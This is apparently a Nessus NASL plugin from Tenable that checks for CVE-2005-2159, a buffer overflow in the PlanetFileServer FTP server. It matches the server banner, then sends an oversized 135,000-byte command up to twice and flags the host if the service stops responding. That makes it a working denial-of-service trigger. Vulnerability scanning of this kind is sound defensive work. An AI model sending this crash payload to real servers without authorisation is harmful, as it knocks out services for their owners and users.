#
# (C) Tenable Network Security
#


if (description) {
  script_id(18611);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2005-2159");
  script_bugtraq_id(14138);

  name["english"] = "PlanetFileServer Remote Buffer Overflow Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote FTP server is prone to a buffer overflow attack.

Description :

The remote host appears to be running PlanetFileServer, an FTP server
for Windows from PlanetDNS. 

The installed version of PlanetFileServer is vulnerable to a buffer
overflow when processing large commands.  An unauthenticated attacker
can trigger this flaw to crash the service or execute arbitrary code
as administrator. 

See also : 

http://www.securityfocus.com/archive/1/404161/30/0/threaded

Solution : 

Unknown at this time.

Risk factor : 

Critical / CVSS Base Score : 10
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for remote buffer overflow vulnerability in PlanetFileServer";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_overflow.nasl");
  script_exclude_keys("ftp/false_ftp", "ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# If the banner suggests it's for PlanetFileServer...
banner = get_ftp_banner(port: port);
if (
  banner && 
  egrep(string:banner, pattern:"^220[ -]mshftp/.+ NewAce Corporation")
) {
  c = string(crap(135000), "\r\n");

  # nb: fRoGGz claims you may need to send the command 2 times
  #     depending on the configured security filter option levels.
  i = 0;
  while((soc = open_sock_tcp(port)) && i++ < 2) {
    # Send a long command.
    send(socket:soc, data:c);
    close(soc);
    sleep(1);
  }

  # There's a problem if we can't open a connection after sending 
  # the exploit at least once.
  if (!soc && i > 0) {
    security_hole(port);
    exit(0);
  }
}
